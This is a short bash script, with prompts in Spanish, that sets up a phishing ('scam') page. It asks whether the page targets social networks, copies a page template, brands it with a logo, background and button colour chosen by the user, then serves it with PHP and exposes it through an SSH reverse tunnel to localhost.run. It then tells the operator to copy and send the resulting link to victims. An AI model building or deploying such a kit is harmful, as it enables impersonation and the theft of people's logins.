date=$(date +'%m-%d' > .dt)
rm -fr .sx
bash .banner
echo "Introduce para que crearas scam:"
echo ""
echo "1)Otros"
echo "2)Redes Sociales"
echo ""
read num

if [ "$num" = "1" ]; then
cp .stb -r .sx
else
cp .st -r .sx
fi

bash .banner
echo "Introduce la imagen que usaras de logo:"
read path
cp $path -r .sx/name.png
mogrify -resize 2560x1440 .sx/name.png
bash .banner
echo "Introduce la imagen que usaras de fondo:"
read path1
cp $path1 -r .sx/fondo.png
bash .banner
echo "Introduce un color en hexagecimal para el color del boton:"
read col
echo 'input[type=submit], select {' > .sx/color.css
echo '  width: 100%;' >> .sx/color.css
echo '  padding: 12px 20px;' >> .sx/color.css
echo "  background-color:$col;" >> .sx/color.css
echo '  color:#ffffff;' >> .sx/color.css
echo '  font-family:Arial;' >> .sx/color.css
echo '  font-size:13px;' >> .sx/color.css
echo '  text-shadow:0px 1px 0px #154682;' >> .sx/color.css
echo '  margin: 8px 0;' >> .sx/color.css
echo '  display: inline-block;' >> .sx/color.css
echo "  border: 1px solid $col;" >> .sx/color.css
echo '  border-radius: 4px;' >> .sx/color.css
echo '  padding:12px 20px;' >> .sx/color.css
echo '  box-sizing: border-box;' >> .sx/color.css
echo "  background:linear-gradient(to bottom, $color 5%, $color 100%);" >> .sx/color.css
echo '  border:1px solid #678aa3;' >> .sx/color.css
echo "" >> .sx/color.css
echo '}' >> .sx/color.css
bash .banner
echo "Copia y encia el enlace que se mostrara a continuacion:"
echo ""
php -S localhost:4444 -t .sx | ssh -R 80:localhost:4444 ssh.localhost.run

